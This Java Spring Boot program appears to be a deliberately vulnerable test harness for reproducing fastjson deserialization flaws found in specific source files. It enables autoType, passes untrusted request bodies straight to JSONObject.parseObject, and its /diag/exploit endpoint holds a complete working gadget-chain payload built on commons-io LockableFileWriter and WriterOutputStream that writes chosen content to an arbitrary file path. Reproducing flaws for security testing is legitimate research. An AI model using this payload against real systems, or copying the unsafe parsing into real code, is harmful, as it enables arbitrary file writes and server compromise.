package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    /**
     * autoType 通过启动参数控制：
     *   java -jar vuln-test-1.0.jar --autotype=true   → 开启（默认）
     *   java -jar vuln-test-1.0.jar --autotype=false  → 关闭（模拟真实目标）
     */
    public static void main(String[] args) {
        boolean autoType = true;
        for (String arg : args) {
            if (arg.equals("--autotype=false")) autoType = false;
            if (arg.equals("--autotype=true"))  autoType = true;
        }
        ParserConfig.getGlobalInstance().setAutoTypeSupport(autoType);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    /** 复现 NotifyServiceImpl.java:150-154 */
    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 复现 ReViewController.java:57
     * 模拟 handvideo 字段内容可控时的 parseObject(handvideo) 触发
     * POST body: {"handvideo": "...fastjson payload..."}
     */
    @PostMapping("/review/simulate")
    public Map<String, Object> reviewSimulate(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String handvideo = body.get("handvideo");
        try {
            log.info("[REVIEW] autoType={} len={} preview={}",
                    ParserConfig.getGlobalInstance().isAutoTypeSupport(),
                    handvideo.length(),
                    handvideo.substring(0, Math.min(100, handvideo.length())));
            // 精确复现: JSONObject.parseObject(retStr)
            JSONObject result = JSONObject.parseObject(handvideo);
            log.info("[REVIEW] parseObject OK keys={}", result == null ? "null" : result.keySet());
            r.put("ok", true);
            r.put("keys", result == null ? "null" : result.keySet().toString());
            r.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        } catch (Exception e) {
            log.error("[REVIEW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            r.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        }
        return r;
    }

    /** 直接接收 fastjson JSON（text/plain），与 /review/simulate 等价但更方便 curl */
    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] autoType={} len={} preview={}",
                    ParserConfig.getGlobalInstance().isAutoTypeSupport(),
                    json.length(), json.substring(0, Math.min(100, json.length())));
            JSONObject result = JSONObject.parseObject(json);
            r.put("ok", true);
            r.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
            if (result != null) r.put("keys", result.keySet().toString());
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping("/diag/exploit")
    public Map<String, Object> diagExploit(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/exploit_test");
        String content = body.getOrDefault("content", "EXPLOIT-OK\n");
        Map<String, Object> detail = new LinkedHashMap<>();
        try {
            String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");
            String fastjsonPayload = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                    + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                    + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                    + "\"file\":\"" + escapedFile + "\","
                    + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                    + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                    + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                    + "\"writer\":{\"$ref\":\"$.lfw\"},"
                    + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}}";
            JSONObject result = JSONObject.parseObject(fastjsonPayload);
            Object wosObj = result.get("wos");
            detail.put("wosType", wosObj == null ? "null" : wosObj.getClass().getSimpleName());
            if (wosObj instanceof WriterOutputStream) {
                WriterOutputStream wos = (WriterOutputStream) wosObj;
                byte[] bytes = content.getBytes(StandardCharsets.ISO_8859_1);
                wos.write(bytes); wos.flush(); wos.close();
            }
            File f = new File(file);
            detail.put("fileExists", f.exists());
            detail.put("fileSize", f.exists() ? f.length() : -1);
            r.put("ok", true); r.put("detail", detail);
        } catch (Exception e) {
            log.error("[EXPLOIT-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }
}
